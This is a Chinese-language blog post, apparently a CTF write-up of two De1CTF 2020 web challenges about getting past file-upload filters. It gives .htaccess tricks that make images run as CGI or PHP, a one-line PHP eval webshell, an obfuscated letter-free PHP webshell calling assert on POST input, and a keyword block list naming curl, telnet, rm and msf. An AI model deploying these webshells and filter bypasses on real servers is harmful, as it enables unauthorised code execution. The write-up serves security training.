---
layout: post
title: De1CTF 2020 Web Writeup
data: 2020-05-02
categories: Writeups
tags: 
 - CTF
 - Writeup
description: 
excerpt_separator: <!-- more -->
---

时隔一年，又见De1CTF，不得不说，我还是曾经那个弟弟。

<!-- more -->

# check in

## 题目描述

一道文件上传，文件名有黑名单，拦截了"ph"，然后文件内容也有正则匹配拦截：

```
perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet
```

## 解题思路

文件名有拦截，还是黑名单，自然地想到了上传htaccess，不过htaccess中的"php"会被检测，隐约感觉PHP没什么希望了。

想到了上传CGI文件，还是比较顺利的，htaccess文件：

```htaccess
Options +ExecCGI
AddHandler cgi-script .png
```

木马文件：

```bash
#!/bin/bash
echo "Content-Type: text/plain"
echo
cat /flag
```

得到flag。

后来发现这题还有一种解法，首先htaccess中的"php"可以换行绕过：

```htaccess
Addtype application/x-httpd-p\
hp .png
```

木马文件：

```php
<?=eval($_POST["cmd"]);
```

甚至可以上传这样的htaccess文件：

```htaccess
AddHandler p\
hp5-script .txt
p\
hp_value au\
to_append_file /flag
```

然后随便上传个TXT文件就会加载flag。

## 备注

1. 在本地测试CGI文件的时候，总是因为没有执行权限而返回500错误，不知道服务器是怎么给上传的文件加权限的。

2. "\<?= ?>"是"echo()"的快捷用法：

    ```php
    <?="foo"?> == echo("foo")
    ```

3. 如果Apache运行mod_php，就可以利用"php_value"关键字更改php.ini的值。

----

# Hard_Pentest_1

## 题目描述

一个文件上传，直接给了源码：

```php
<?php
//Clear the uploads directory every hour
highlight_file(__FILE__);
$sandbox = "uploads/". md5("De1CTF2020".$_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);

if($_POST["submit"]){
    if (($_FILES["file"]["size"] < 2048) && Check()){
        if ($_FILES["file"]["error"] > 0){
            die($_FILES["file"]["error"]);
        }
        else{
            $filename=$_FILES["file"]["name"];
            move_uploaded_file($_FILES["file"]["tmp_name"], $filename);
            echo "save in:" . $sandbox."/" . $filename;
        }
    }
    else{
        echo "Not Allow!";
    }
}

function Check(){
    $BlackExts = array("php");
    $ext = explode(".", $_FILES["file"]["name"]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES["file"]["tmp_name"]);

    if(!preg_match('/[a-z0-9;~^`&|]/is',$file_content)  && 
        !in_array($exts, $BlackExts) && 
        !preg_match('/\.\./',$_FILES["file"]["name"])) {
          return true;
    }
    return false;
}
?>
```

## 解题思路

文件名的拦截容易绕，然后还有内容的检测，就是构造一个无字母和数字的Shell：

```php
<?=$_=[]?><?=$_="$_"?><?=$_=$_['!'=='@']?>

<?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?>

<?=$___=$_?><?=$___++?><?=$___++?><?=$___++?><?=$___++?>

<?=$____=$_?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?>

<?=$_____=$_?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?>

<?=$__=$_.$__.$__.$___.$____.$_____?>

<?=$___=$_?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?><?=$___++?>

<?=$____=$_?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?><?=$____++?>

<?=$_____=$_?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?><?=$_____++?>

<?=$______=$_?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?><?=$______++?>

<?=$_='_'.$___.$____.$_____.$______?>
<?=$_=$$_?>

<?=$__($_['_'])?>
```

等价于：

```php
<?php
$foo = "ASSERT";
$bar = "_POST";
$bar = $$bar;
$foo($bar['_']); //assert($_POST['_'])
?>
```

执行之后发现Shell命令无法执行，用PHP内置函数看一下目录，发现是Windows。

然后就卡住了。

## 备注

1. eval()是PHP语法构造的一部分，不能通过可变函数调用。
2. assert()在PHP7中默认无法再执行代码。